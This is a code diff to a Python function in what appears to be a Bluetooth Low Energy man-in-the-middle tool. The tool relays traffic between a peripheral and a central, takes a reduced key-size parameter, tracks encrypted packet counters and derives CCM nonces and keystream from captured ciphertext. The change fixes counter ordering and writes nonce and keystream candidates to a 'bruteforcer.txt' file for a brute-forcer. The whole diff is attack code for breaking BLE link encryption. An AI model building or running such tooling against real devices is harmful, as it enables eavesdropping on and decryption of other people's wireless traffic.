@@ -469,16 +469,16 @@ def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
                         # P -> C_r
                         if last_sn_p_to_c is None:
                             # First encrypted PDU in this direction
-                            enc_ctr_p_to_c += 1
                             packet_counter = enc_ctr_p_to_c
+                            enc_ctr_p_to_c += 1
                             last_sn_p_to_c = sn_bit
                             last_pdu_p_to_c = pdu
                             print(f"P->C_r FIRST encrypted PDU, packetCounter={packet_counter}")
 
                         elif sn_bit != last_sn_p_to_c:
                             # SN toggled -> definitely a new PDU
-                            enc_ctr_p_to_c += 1
                             packet_counter = enc_ctr_p_to_c
+                            enc_ctr_p_to_c += 1
                             last_sn_p_to_c = sn_bit
                             last_pdu_p_to_c = pdu
                             print(f"P->C_r NEW encrypted PDU (SN toggled), packetCounter={packet_counter}")
@@ -571,20 +571,13 @@ def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
                     keystream = bytes(a ^ b for a, b in zip(plaintext_test, ciphertext_test))
                     print(f"       Plaintext for HULK: {_hx(a0)}")
                     print(f"       Ciphertext for HULK: {_hx(keystream)}")
-                    nonce = make_ble_ccm_nonce(iv_real_cp, packet_counter+1, direction_bit)
-                    a0 = make_ble_ccm_counter_block(nonce, block_index=2)
-                    plaintext_test = bytes(16)
-                    ciphertext_test = ciphertext[-VALUE_LEN:]
-                    keystream = bytes(a ^ b for a, b in zip(plaintext_test, ciphertext_test))
-                    print(f"       Plaintext for HULK: {_hx(a0)}")
-                    print(f"       Ciphertext for HULK: {_hx(keystream)}")
-                    nonce = make_ble_ccm_nonce(iv_real_cp, packet_counter-1, direction_bit)
-                    a0 = make_ble_ccm_counter_block(nonce, block_index=2)
-                    plaintext_test = bytes(16)
-                    ciphertext_test = ciphertext[-VALUE_LEN:]
-                    keystream = bytes(a ^ b for a, b in zip(plaintext_test, ciphertext_test))
-                    print(f"       Plaintext for HULK: {_hx(a0)}")
-                    print(f"       Ciphertext for HULK: {_hx(keystream)}")
+                    with open("bruteforcer.txt", "a") as f:
+                        f.write(f"{_hx(nonce)}\n")
+                        f.write(f"{_hx(keystream)}\n")                        
+                        f.write(f"{_hx(a0)}\n")
+                        f.write(f"{_hx(keystream)}\n")
+                        f.write("\n")  # blank line between entries (optional)
+
 
         # LL_ENC_RSP from P to extract IV
         if isinstance(msg, LlControlMessage) and msg.opcode == 0x04:
